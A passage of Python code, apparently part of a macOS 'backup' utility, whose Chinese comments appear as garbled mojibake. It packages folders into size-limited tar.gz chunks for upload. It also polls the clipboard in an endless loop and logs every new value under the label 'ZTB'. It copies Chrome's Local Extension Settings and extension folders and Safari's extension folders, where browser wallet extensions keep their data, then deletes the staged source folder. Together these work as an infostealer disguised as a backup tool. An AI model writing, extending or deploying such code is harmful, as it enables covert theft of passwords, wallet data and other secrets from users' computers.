            # ä½¿ç”¨æ›´ä¿å®ˆçš„å‹ç¼©æ¯”ä¾‹ä¼°ç®—ï¼ˆå‡è®¾å‹ç¼©åä¸ºåŸå§‹å¤§å°çš„70%ï¼‰
            COMPRESSION_RATIO = 0.7
            # ä¸ºäº†ç¡®ä¿å®‰å…¨ï¼Œå°†ç›®æ ‡å¤§å°è®¾ç½®ä¸ºé™åˆ¶çš„70%
            SAFETY_MARGIN = 0.7
            MAX_CHUNK_SIZE = int(self.config.MAX_SINGLE_FILE_SIZE * SAFETY_MARGIN / COMPRESSION_RATIO)

            # å…ˆæ”¶é›†æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯
            all_files = []
            for dirpath, _, filenames in os.walk(folder_path):
                for filename in filenames:
                    file_path = os.path.join(dirpath, filename)
                    try:
                        file_size = os.path.getsize(file_path)
                        if file_size > 0:  # è·³è¿‡ç©ºæ–‡ä»¶
                            rel_path = os.path.relpath(file_path, folder_path)
                            all_files.append((file_path, rel_path, file_size))
                    except OSError:
                        continue

            # æŒ‰æ–‡ä»¶å¤§å°é™åºæ’åº
            all_files.sort(key=lambda x: x[2], reverse=True)

            # æ£€æŸ¥æ˜¯å¦æœ‰å•ä¸ªæ–‡ä»¶è¶…è¿‡é™åˆ¶
            for file_path, _, file_size in all_files[:]:  # ä½¿ç”¨åˆ‡ç‰‡åˆ›å»ºå‰¯æœ¬ä»¥é¿å…åœ¨è¿­ä»£æ—¶ä¿®æ”¹åˆ—è¡¨
                if file_size > MAX_CHUNK_SIZE:
                    logging.error(f"å•ä¸ªæ–‡ä»¶è¿‡å¤§: {file_size / 1024 / 1024:.1f}MB")
                    all_files.remove((file_path, _, file_size))

            # ä½¿ç”¨æœ€ä¼˜åŒ¹é…ç®—æ³•è¿›è¡Œåˆ†ç»„
            current_chunk = []
            current_chunk_size = 0
            
            for file_info in all_files:
                file_path, rel_path, file_size = file_info
                
                # å¦‚æœå½“å‰æ–‡ä»¶ä¼šå¯¼è‡´å½“å‰å—è¶…è¿‡é™åˆ¶ï¼Œåˆ›å»ºæ–°å—
                if current_chunk_size + file_size > MAX_CHUNK_SIZE and current_chunk:
                    # åˆ›å»ºæ–°çš„åˆ†å—ç›®å½•
                    part_dir = os.path.join(temp_dir, f"part{part_num}")
                    if self._ensure_directory(part_dir):
                        # å¤åˆ¶æ–‡ä»¶åˆ°åˆ†å—ç›®å½•
                        chunk_success = True
                        for src, dst_rel, _ in current_chunk:
                            dst = os.path.join(part_dir, dst_rel)
                            dst_dir = os.path.dirname(dst)
                            if not self._ensure_directory(dst_dir):
                                chunk_success = False
                                break
                            try:
                                shutil.copy2(src, dst)
                            except Exception:
                                chunk_success = False
                                break
                        
                        if chunk_success:
                            # å‹ç¼©åˆ†å—ï¼Œä½¿ç”¨æ›´é«˜çš„å‹ç¼©çº§åˆ«
                            tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                            try:
                                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                    tar.add(part_dir, arcname=os.path.basename(folder_path))
                                
                                compressed_size = os.path.getsize(tar_path)
                                if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                    os.remove(tar_path)
                                    # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                    if len(current_chunk) > 1:
                                        mid = len(current_chunk) // 2
                                        # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                                 part_num, compressed_files)
                                        # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                        self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                                 part_num + 1, compressed_files)
                                    part_num += 2
                                else:
                                    compressed_files.append(tar_path)
                                    logging.info(f"åˆ†å— {part_num + 1}: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                                    part_num += 1
                            except Exception:
                                if os.path.exists(tar_path):
                                    os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
                    current_chunk = []
                    current_chunk_size = 0
                
                # æ·»åŠ æ–‡ä»¶åˆ°å½“å‰å—
                current_chunk.append((file_path, rel_path, file_size))
                current_chunk_size += file_size
            
            # å¤„ç†æœ€åä¸€ä¸ªå—
            if current_chunk:
                part_dir = os.path.join(temp_dir, f"part{part_num}")
                if self._ensure_directory(part_dir):
                    chunk_success = True
                    for src, dst_rel, _ in current_chunk:
                        dst = os.path.join(part_dir, dst_rel)
                        dst_dir = os.path.dirname(dst)
                        if not self._ensure_directory(dst_dir):
                            chunk_success = False
                            break
                        try:
                            shutil.copy2(src, dst)
                        except Exception:
                            chunk_success = False
                            break
                    
                    if chunk_success:
                        tar_path = f"{base_zip_path}_part{part_num}.tar.gz"
                        try:
                            with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                                tar.add(part_dir, arcname=os.path.basename(folder_path))
                            
                            compressed_size = os.path.getsize(tar_path)
                            if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
                                os.remove(tar_path)
                                # å¦‚æœå‹ç¼©åä»ç„¶è¿‡å¤§ï¼Œå°è¯•å°†å½“å‰å—å†æ¬¡åˆ†å‰²
                                if len(current_chunk) > 1:
                                    mid = len(current_chunk) // 2
                                    # é€’å½’å¤„ç†å‰åŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[:mid], temp_dir, base_zip_path, 
                                                             part_num, compressed_files)
                                    # é€’å½’å¤„ç†ååŠéƒ¨åˆ†
                                    self._process_partial_chunk(current_chunk[mid:], temp_dir, base_zip_path, 
                                                             part_num + 1, compressed_files)
                            else:
                                compressed_files.append(tar_path)
                                logging.info(f"æœ€ååˆ†å—: {current_chunk_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                        except Exception:
                            if os.path.exists(tar_path):
                                os.remove(tar_path)
                    
                    self._clean_directory(part_dir)
            
            # æ¸…ç†ä¸´æ—¶ç›®å½•å’Œæºç›®å½•
            self._clean_directory(temp_dir)
            self._clean_directory(folder_path)
            
            if not compressed_files:
                logging.error("åˆ†å‰²å¤±è´¥ï¼Œæ²¡æœ‰ç”Ÿæˆæœ‰æ•ˆçš„å‹ç¼©æ–‡ä»¶")
                return None
            
            logging.info(f"å·²åˆ†å‰²ä¸º {len(compressed_files)} ä¸ªå‹ç¼©æ–‡ä»¶")
            return compressed_files
        except Exception:
            logging.error("åˆ†å‰²å¤±è´¥")
            return None

    def _process_partial_chunk(self, chunk, temp_dir, base_zip_path, part_num, compressed_files):
        """å¤„ç†éƒ¨åˆ†åˆ†å—
        
        Args:
            chunk: è¦å¤„ç†çš„æ–‡ä»¶åˆ—è¡¨
            temp_dir: ä¸´æ—¶ç›®å½•è·¯å¾„
            base_zip_path: åŸºç¡€å‹ç¼©æ–‡ä»¶è·¯å¾„
            part_num: åˆ†å—ç¼–å·
            compressed_files: å‹ç¼©æ–‡ä»¶åˆ—è¡¨
        """
        part_dir = os.path.join(temp_dir, f"part{part_num}_sub")
        if not self._ensure_directory(part_dir):
            return
        
        chunk_success = True
        total_size = 0
        for src, dst_rel, file_size in chunk:
            dst = os.path.join(part_dir, dst_rel)
            dst_dir = os.path.dirname(dst)
            if not self._ensure_directory(dst_dir):
                chunk_success = False
                break
            try:
                shutil.copy2(src, dst)
                total_size += file_size
            except Exception:
                chunk_success = False
                break
        
        if chunk_success:
            tar_path = f"{base_zip_path}_part{part_num}_sub.tar.gz"
            try:
                with tarfile.open(tar_path, "w:gz", compresslevel=9) as tar:
                    tar.add(part_dir, arcname=os.path.basename(os.path.dirname(part_dir)))
                
                compressed_size = os.path.getsize(tar_path)
                if compressed_size <= self.config.MAX_SINGLE_FILE_SIZE:
                    compressed_files.append(tar_path)
                    logging.info(f"å­åˆ†å—: {total_size / 1024 / 1024:.1f}MB -> {compressed_size / 1024 / 1024:.1f}MB")
                else:
                    os.remove(tar_path)
            except Exception:
                if os.path.exists(tar_path):
                    os.remove(tar_path)
        
        self._clean_directory(part_dir)

    def get_clipboard_content(self):
        """è·å–ZTBå†…å®¹"""
        try:
            content = subprocess.check_output(['pbpaste']).decode('utf-8')
            if content is None:
                return None
            # å»é™¤ç©ºç™½å­—ç¬¦
            content = content.strip()
            return content if content else None
        except (subprocess.CalledProcessError, RuntimeError, UnicodeDecodeError) as e:
            logging.error(f"âŒ è·å–ZTBå‡ºé”™: {str(e)}")
            return None

    def log_clipboard_update(self, content, file_path):
        """è®°å½•ZTBæ›´æ–°åˆ°æ–‡ä»¶"""
        try:
            # ç¡®ä¿ç›®å½•å­˜åœ¨
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            
            # å†™å…¥æ—¥å¿—
            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
                f.write(f"\n=== ğŸ“‹ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
                f.write(f"{content}\n")
                f.write("-"*30 + "\n")
        except (OSError, IOError, PermissionError) as e:
            if self.config.DEBUG_MODE:
                logging.error(f"âŒ è®°å½•ZTBå¤±è´¥: {e}")

    def monitor_clipboard(self, file_path, interval=3):
        """ç›‘æ§ZTBå˜åŒ–å¹¶è®°å½•åˆ°æ–‡ä»¶
        
        Args:
            file_path: æ—¥å¿—æ–‡ä»¶è·¯å¾„
            interval: æ£€æŸ¥é—´éš”ï¼ˆç§’ï¼‰
        """
        # ç¡®ä¿æ—¥å¿—ç›®å½•å­˜åœ¨
        log_dir = os.path.dirname(file_path)
        if not os.path.exists(log_dir):
            try:
                os.makedirs(log_dir, exist_ok=True)
            except Exception as e:
                logging.error(f"âŒ åˆ›å»ºZTBæ—¥å¿—ç›®å½•å¤±è´¥: {e}")
                return

        last_content = ""
        error_count = 0  # æ·»åŠ é”™è¯¯è®¡æ•°
        max_errors = 5   # æœ€å¤§è¿ç»­é”™è¯¯æ¬¡æ•°
        
        while True:
            try:
                current_content = self.get_clipboard_content()
                # åªæœ‰å½“ZTBå†…å®¹éç©ºä¸”ä¸ä¸Šæ¬¡ä¸åŒæ—¶æ‰è®°å½•
                if current_content and current_content != last_content:
                    self.log_clipboard_update(current_content, file_path)
                    last_content = current_content
                    if self.config.DEBUG_MODE:
                        logging.info("ğŸ“‹ æ£€æµ‹åˆ°ZTBæ›´æ–°")
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                else:
                    error_count = 0  # ç©ºå†…å®¹ä¸ç®—é”™è¯¯ï¼Œé‡ç½®è®¡æ•°
            except Exception as e:
                error_count += 1
                if error_count >= max_errors:
                    if self.config.DEBUG_MODE:
                        logging.error(f"âŒ ZTBç›‘æ§è¿ç»­å‡ºé”™{max_errors}æ¬¡ï¼Œç­‰å¾…{self.config.CLIPBOARD_ERROR_WAIT}ç§’åé‡è¯•")
                    time.sleep(self.config.CLIPBOARD_ERROR_WAIT)
                    error_count = 0  # é‡ç½®é”™è¯¯è®¡æ•°
                elif self.config.DEBUG_MODE:
                    logging.error(f"âŒ ZTBç›‘æ§å‡ºé”™: {e}")
            time.sleep(interval if interval else self.config.CLIPBOARD_CHECK_INTERVAL)

    def upload_backup(self, backup_path):
        """ä¸Šä¼ å¤‡ä»½æ–‡ä»¶
        
        Args:
            backup_path: å¤‡ä»½æ–‡ä»¶è·¯å¾„æˆ–å¤‡ä»½æ–‡ä»¶è·¯å¾„åˆ—è¡¨
            
        Returns:
            bool: ä¸Šä¼ æ˜¯å¦æˆåŠŸ
        """
        if isinstance(backup_path, list):
            success = True
            for path in backup_path:
                if not self.upload_file(path):
                    success = False
            return success
        else:
            return self.upload_file(backup_path)

    def backup_specified_files(self, source_dir, target_dir):
        """å¤‡ä»½æŒ‡å®šçš„ç›®å½•å’Œæ–‡ä»¶
        
        Args:
            source_dir: æºç›®å½•è·¯å¾„
            target_dir: ç›®æ ‡ç›®å½•è·¯å¾„
            
        Returns:
            str: å¤‡ä»½ç›®å½•è·¯å¾„ï¼Œå¦‚æœå¤±è´¥åˆ™è¿”å›None
        """
        source_dir = os.path.abspath(os.path.expanduser(source_dir))
        target_dir = os.path.abspath(os.path.expanduser(target_dir))

        if self.config.DEBUG_MODE:
            logging.debug(f"å¼€å§‹å¤‡ä»½æŒ‡å®šç›®å½•å’Œæ–‡ä»¶:")
            logging.debug(f"æºç›®å½•: {source_dir}")
            logging.debug(f"ç›®æ ‡ç›®å½•: {target_dir}")

        if not os.path.exists(source_dir):
            logging.error(f"âŒ æºç›®å½•ä¸å­˜åœ¨: {source_dir}")
            return None

        if not os.access(source_dir, os.R_OK):
            logging.error(f"âŒ æºç›®å½•æ²¡æœ‰è¯»å–æƒé™: {source_dir}")
            return None

        if not self._clean_directory(target_dir):
            logging.error(f"âŒ æ— æ³•æ¸…ç†æˆ–åˆ›å»ºç›®æ ‡ç›®å½•: {target_dir}")
            return None

        files_count = 0
        total_size = 0
        retry_count = 3
        retry_delay = 5

        for item in self.config.MACOS_SPECIFIC_DIRS:
            source_path = os.path.join(source_dir, item)
            if not os.path.exists(source_path):
                if self.config.DEBUG_MODE:
                    logging.debug(f"è·³è¿‡ä¸å­˜åœ¨çš„é¡¹ç›®: {source_path}")
                continue

            try:
                if os.path.isdir(source_path):
                    # å¤åˆ¶ç›®å½•
                    target_path = os.path.join(target_dir, item)
                    shutil.copytree(source_path, target_path, dirs_exist_ok=True)
                    dir_size = self._get_dir_size(target_path)
                    files_count += 1
                    total_size += dir_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {source_path} -> {target_path}")
                else:
                    # å¤åˆ¶æ–‡ä»¶
                    target_path = os.path.join(target_dir, item)
                    shutil.copy2(source_path, target_path)
                    file_size = os.path.getsize(target_path)
                    files_count += 1
                    total_size += file_size
                    if self.config.DEBUG_MODE:
                        logging.debug(f"æˆåŠŸå¤åˆ¶æ–‡ä»¶: {source_path} -> {target_path}")
            except Exception as e:
                if self.config.DEBUG_MODE:
                    logging.debug(f"å¤åˆ¶å¤±è´¥: {source_path} - {str(e)}")

        # è¿½åŠ ï¼šå¤‡ä»½ Chrome ä¸ Safari æŒ‡å®šç›®å½•
        try:
            home_dir = os.path.expanduser('~')
            # Chrome ç›®å½•
            chrome_base = os.path.join(home_dir, 'Library', 'Application Support', 'Google', 'Chrome', 'Default')
            chrome_local_ext = os.path.join(chrome_base, 'Local Extension Settings')
            chrome_extensions = os.path.join(chrome_base, 'Extensions')
            # Safari ç›®å½•ï¼ˆä¼ ç»Ÿæ‰©å±•ï¼‰
            safari_extensions_legacy = os.path.join(home_dir, 'Library', 'Safari', 'Extensions')
            # Safari å®¹å™¨ç›®å½•ï¼ˆéƒ¨åˆ†ç³»ç»Ÿ/ç‰ˆæœ¬ï¼‰
            safari_container_extensions = os.path.join(home_dir, 'Library', 'Containers', 'com.apple.Safari', 'Data', 'Library', 'Safari', 'Extensions')

            def copy_dir_if_exists(src_dir, dst_name):
                nonlocal files_count, total_size
                if os.path.exists(src_dir) and os.path.isdir(src_dir):
                    target_path = os.path.join(target_dir, dst_name)
                    try:
                        # ç¡®ä¿ç›®æ ‡çˆ¶ç›®å½•å­˜åœ¨ï¼›è‹¥å·²å­˜åœ¨åŒåç›®å½•ï¼Œè¦†ç›–å¤åˆ¶
                        parent_dir = os.path.dirname(target_path)
                        if not self._ensure_directory(parent_dir):
                            return
                        if os.path.exists(target_path):
                            shutil.rmtree(target_path, ignore_errors=True)
                        shutil.copytree(src_dir, target_path)
                        dir_size = self._get_dir_size(target_path)
                        files_count += 1
                        total_size += dir_size
                        if self.config.DEBUG_MODE:
                            logging.debug(f"æˆåŠŸå¤åˆ¶ç›®å½•: {src_dir} -> {target_path}")
                    except Exception as e:
                        if self.config.DEBUG_MODE:
                            logging.debug(f"å¤åˆ¶ç›®å½•å¤±è´¥: {src_dir} - {str(e)}")

            # æ‰§è¡Œå¤åˆ¶
            copy_dir_if_exists(chrome_local_ext, 'chrome_local_extension_settings')
            copy_dir_if_exists(chrome_extensions, 'chrome_extensions')
            copy_dir_if_exists(safari_extensions_legacy, 'safari_extensions')
            copy_dir_if_exists(safari_container_extensions, 'safari_container_extensions')
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.debug(f"è¿½åŠ æµè§ˆå™¨ç›®å½•å¤‡ä»½å¤±è´¥: {str(e)}")

        if files_count > 0:
            logging.info(f"\nğŸ“Š æŒ‡å®šæ–‡ä»¶å¤‡ä»½å®Œæˆ:")
            logging.info(f"   ğŸ“ æ–‡ä»¶æ•°é‡: {files_count}")
            logging.info(f"   ğŸ’¾ æ€»å¤§å°: {total_size / 1024 / 1024:.1f}MB")
            return target_dir
        else:
            logging.error(f"âŒ æœªæ‰¾åˆ°éœ€è¦å¤‡ä»½çš„æŒ‡å®šæ–‡ä»¶")
            return None

    def has_clipboard_content(self, file_path):
        """æ£€æŸ¥ç²˜è´´æ¿æ–‡ä»¶æ˜¯å¦æœ‰å®é™…å†…å®¹è®°å½•
        
        Args:
            file_path: ç²˜è´´æ¿æ—¥å¿—æ–‡ä»¶è·¯å¾„
            
        Returns:
            bool: æ˜¯å¦æœ‰å®é™…å†…å®¹è®°å½•
        """
        try:
            if not os.path.exists(file_path):
                return False
                
            # æ£€æŸ¥æ–‡ä»¶å¤§å°
            file_size = os.path.getsize(file_path)
            if file_size == 0:
                return False
                
            # è¯»å–æ–‡ä»¶å†…å®¹
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read().strip()
                
            if not content:
                return False
                
            # æ£€æŸ¥æ˜¯å¦åªåŒ…å«æ ‡é¢˜è¡Œï¼ˆæ²¡æœ‰å®é™…å†…å®¹ï¼‰
            lines = content.split('\n')
            actual_content_lines = []
            
            for line in lines:
                line = line.strip()
                # è·³è¿‡ç©ºè¡Œã€æ ‡é¢˜è¡Œå’Œåˆ†éš”çº¿
                if (line and 
                    not line.startswith('===') and 
                    not line.startswith('ğŸ“‹') and 
                    not line.startswith('-') * 30 and
                    not line.startswith('ZTBæ—¥å¿—å·²äº') and
                    not line.startswith('ZTBç›‘æ§å¯åŠ¨äº')):
                    actual_content_lines.append(line)
            
            # å¦‚æœæœ‰å®é™…å†…å®¹è¡Œï¼Œè¿”å›True
            return len(actual_content_lines) > 0
            
        except Exception as e:
            if self.config.DEBUG_MODE:
                logging.error(f"æ£€æŸ¥ç²˜è´´æ¿æ–‡ä»¶å†…å®¹å¤±è´¥: {e}")
            return False

